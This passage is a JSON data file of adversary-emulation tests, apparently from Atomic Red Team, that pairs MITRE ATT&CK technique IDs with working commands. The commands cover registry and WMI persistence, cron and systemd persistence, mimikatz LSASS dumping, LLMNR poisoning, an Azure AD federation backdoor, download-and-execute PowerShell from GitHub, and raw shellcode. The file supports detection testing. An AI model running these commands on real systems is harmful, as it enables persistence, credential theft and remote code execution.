         "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan; New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null; Write-Host \"executing eventvwr.msc\" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC"
      },
      {
         "technique_id": "T1574.012",
         "technique_name": "Hijack Execution Flow: COR_PROFILER",
         "tactic": "multiple",
         "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
         "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"83f016_T1574.012x64.dll\" -Force | Out-Null"
      },
      {
         "technique_id": "T1574.012",
         "technique_name": "Hijack Execution Flow: COR_PROFILER",
         "tactic": "multiple",
         "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
         "command": "$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '\"83f016_T1574.012x64.dll\"'; POWERSHELL -c 'Start-Sleep 1'"
      }
   ],
   "T1547.010": [
      {
         "technique_id": "T1547.010",
         "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
         "tactic": "multiple",
         "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
         "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"dba276_PortMonitor.dll\" /t REG_SZ /f"
      }
   ],
   "T1546": [
      {
         "technique_id": "T1546",
         "technique_name": "Event Triggered Execution",
         "tactic": "multiple",
         "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
         "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
      },
      {
         "technique_id": "T1546",
         "technique_name": "Event Triggered Execution",
         "tactic": "multiple",
         "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
         "command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"
      },
      {
         "technique_id": "T1546",
         "technique_name": "Event Triggered Execution",
         "tactic": "multiple",
         "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
         "command": " $RemoteComputer = \"localhost\";  $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword;  $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;  $ProcessToStart = \"calc.exe\";  $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};  if ($Result.ReturnValue -eq 0) {;      Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\";  } else {;      Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\";  };  Remove-CimSession -CimSession $CimSession"
      },
      {
         "technique_id": "T1546",
         "technique_name": "Event Triggered Execution",
         "tactic": "multiple",
         "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
         "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
      }
   ],
   "T1546.003": [
      {
         "technique_id": "T1546.003",
         "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
         "tactic": "multiple",
         "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
         "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"
      },
      {
         "technique_id": "T1546.003",
         "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
         "tactic": "multiple",
         "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
         "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs"
      },
      {
         "technique_id": "T1546.003",
         "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
         "tactic": "multiple",
         "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
         "command": "c:\\windows\\system32\\wbem\\mofcomp.exe \"715d8f_T1546.003.mof\""
      }
   ],
   "T1055": [
      {
         "technique_id": "T1055",
         "technique_name": "Process Injection",
         "tactic": "multiple",
         "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\""
      },
      {
         "technique_id": "T1055",
         "technique_name": "Process Injection",
         "tactic": "multiple",
         "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"40c65d_T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\""
      },
      {
         "technique_id": "T1055",
         "technique_name": "Process Injection",
         "tactic": "multiple",
         "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
         "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id"
      },
      {
         "technique_id": "T1055",
         "technique_name": "Process Injection",
         "tactic": "multiple",
         "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
         "command": "$notepad = Start-Process notepad -passthru; Start-Process \"C:\\Users\\puma-4\\Desktop\\InjectView.exe\""
      },
      {
         "technique_id": "T1055",
         "technique_name": "Process Injection",
         "tactic": "defense-evasion",
         "description": "Start a new calculator process",
         "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"
      }
   ],
   "T1543.002": [
      {
         "technique_id": "T1543.002",
         "technique_name": "Create or Modify System Process: Systemd Service",
         "tactic": "multiple",
         "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
         "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then : ; else echo Please run from Ubuntu ,Kali OR CentOS.; fi;  ;  cat > /etc/init.d/T1543.002 << EOF; python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"; EOF; chmod +x /etc/init.d/T1543.002; if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ; systemctl enable T1543.002; systemctl start T1543.002; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002; systemctl daemon-reload; systemctl restart T1543.002"
      },
      {
         "technique_id": "T1543.002",
         "technique_name": "Create or Modify System Process: Systemd Service",
         "tactic": "multiple",
         "description": "This test creates a Systemd service unit file and enables it as a service.\n",
         "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service; echo \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Service]\" >> /etc/systemd/system/art-systemd-service.service; echo \"Type=simple\"; echo \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Install]\" >> /etc/systemd/system/art-systemd-service.service; echo \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload; systemctl enable art-systemd-service.service; systemctl start art-systemd-service.service"
      }
   ],
   "T1557.001": [
      {
         "technique_id": "T1557.001",
         "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
         "tactic": "multiple",
         "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y"
      }
   ],
   "T1543.004": [
      {
         "technique_id": "T1543.004",
         "technique_name": "Create or Modify System Process: Launch Daemon",
         "tactic": "multiple",
         "description": "Utilize LaunchDaemon to launch `Hello World`\n",
         "command": "sudo cp f5fe80_atomicredteam_T1543_004.plist /Library/LaunchDaemons/com.atomicredteam.plist; sudo launchctl load -w /Library/LaunchDaemons/com.atomicredteam.plist"
      }
   ],
   "T1072": [
      {
         "technique_id": "T1072",
         "technique_name": "Software Deployment Tools",
         "tactic": "multiple",
         "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n",
         "command": "\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\""
      },
      {
         "technique_id": "T1072",
         "technique_name": "Software Deployment Tools",
         "tactic": "multiple",
         "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
         "command": "\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\""
      }
   ],
   "T1484.002": [
      {
         "technique_id": "T1484.002",
         "technique_name": "Domain Trust Modification",
         "tactic": "multiple",
         "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
         "command": "Import-Module AzureAD; Import-Module AADInternals; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword; try {;   Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null; }; catch {;   Write-Host \"Error: AzureAD could not connect\";   exit 1; }; try {;   $domain = Get-AzureADDomain -Name \"contoso.com\"; }; catch {;   Write-Host \"Error: domain \"\"contoso.com\"\" not found\";   exit 1; }; if (-Not $domain.IsVerified) {;   Write-Host \"Error: domain \"\"contoso.com\"\" not verified\";   exit 1; }; if ($domain.AuthenticationType -eq \"Federated\") {;   Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\";   exit 1; }; $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential; if (-Not $at) {;   Write-Host \"Error: AADInternals could not connect\";   exit 1; }; $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"; if ($new) {;   Write-Host \"Federation successfully added to Azure AD\";   Write-Host $new; }; else {;   Write-Host \"The federation setup failed\"; }; Write-Host \"End of federation configuration.\""
      }
   ],
   "T1547.005": [
      {
         "technique_id": "T1547.005",
         "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
         "tactic": "multiple",
         "description": "Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n",
         "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'); Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\"; $newvalue = \"AtomicTest.dll\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue"
      },
      {
         "technique_id": "T1547.005",
         "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
         "tactic": "multiple",
         "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
         "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'); Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\"; $newvalue = \"AtomicTest.dll\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue"
      }
   ],
   "T1546.010": [
      {
         "technique_id": "T1546.010",
         "technique_name": "Event Triggered Execution: AppInit DLLs",
         "tactic": "multiple",
         "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
         "command": "reg.exe import \"e764f6_T1546.010.reg\""
      }
   ],
   "T1134.002": [
      {
         "technique_id": "T1134.002",
         "technique_name": "Create Process with Token",
         "tactic": "multiple",
         "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
         "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; & \"C:\\Users\\puma-4\\Desktop\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")"
      },
      {
         "technique_id": "T1134.002",
         "technique_name": "Create Process with Token",
         "tactic": "multiple",
         "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem"
      }
   ],
   "T1546.005": [
      {
         "technique_id": "T1546.005",
         "technique_name": "Event Triggered Execution: Trap",
         "tactic": "multiple",
         "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
         "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'"
      },
      {
         "technique_id": "T1546.005",
         "technique_name": "Event Triggered Execution: Trap",
         "tactic": "multiple",
         "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
         "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'"
      }
   ],
   "T1053.003": [
      {
         "technique_id": "T1053.003",
         "technique_name": "Scheduled Task/Job: Cron",
         "tactic": "multiple",
         "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
         "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil"
      },
      {
         "technique_id": "T1053.003",
         "technique_name": "Scheduled Task/Job: Cron",
         "tactic": "multiple",
         "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
         "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil"
      },
      {
         "technique_id": "T1053.003",
         "technique_name": "Scheduled Task/Job: Cron",
         "tactic": "multiple",
         "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
         "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil"
      }
   ],
   "T1546.012": [
      {
         "technique_id": "T1546.012",
         "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
         "tactic": "multiple",
         "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
         "command": "$Name = \"GlobalFlag\"; $Value = \"512\"; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; New-Item -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force; $Name = \"ReportingMode\"; $Value = \"1\"; $SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"; New-Item -Path $SilentProcessExit -Force; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ; $Name = \"MonitorProcess\"; $Value = \"cmd.exe /c calc.exe\"; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force; Start-Process whoami.exe"
      },
      {
         "technique_id": "T1546.012",
         "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
         "tactic": "multiple",
         "description": "Leverage Global Flags Settings\n",
         "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\""
      },
      {
         "technique_id": "T1546.012",
         "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
         "tactic": "multiple",
         "description": "Leverage Global Flags Settings\n",
         "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\""
      }
   ],
   "T1053.002": [
      {
         "technique_id": "T1053.002",
         "technique_name": "Scheduled Task/Job: At",
         "tactic": "multiple",
         "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
         "command": "at 13:20 /interactive cmd"
      },
      {
         "technique_id": "T1053.002",
         "technique_name": "Scheduled Task/Job: At",
         "tactic": "multiple",
         "description": "This test submits a command to be run in the future by the `at` daemon.\n",
         "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute"
      }
   ],
   "T1550.003": [
      {
         "technique_id": "T1550.003",
         "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
         "tactic": "multiple",
         "description": "Similar to PTH, but attacking Kerberos\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe\" \"kerberos::ptt None\""
      },
      {
         "technique_id": "T1550.003",
         "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
         "tactic": "multiple",
         "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
